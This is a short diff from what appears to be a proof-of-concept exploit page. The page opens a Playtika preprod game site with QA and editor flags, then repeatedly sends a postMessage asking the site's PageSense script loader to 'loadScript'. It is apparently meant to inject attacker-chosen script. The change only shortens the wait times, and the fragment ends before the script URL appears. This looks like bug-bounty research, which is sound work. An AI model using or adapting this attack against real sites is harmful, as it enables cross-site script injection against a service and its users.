@@ -9,9 +9,9 @@
         async function open_hofcom() {
 
             win_attcker = window.open("https://preprod-hofcom.playtika.com/play-now/?qa_mode=true&ps_editor=true&ps_verifyscript=true");
-            await new Promise((resolve) => setTimeout(resolve, 1000));
+            await new Promise((resolve) => setTimeout(resolve, 500));
             for (var i = 0; i < 10; i++) {
-                await new Promise((resolve) => setTimeout(resolve, 1000));
+                await new Promise((resolve) => setTimeout(resolve, 500));
                 win_attcker.postMessage({
                     "id": "pagesense-scriptloader-message",
                     "action": "loadScript",
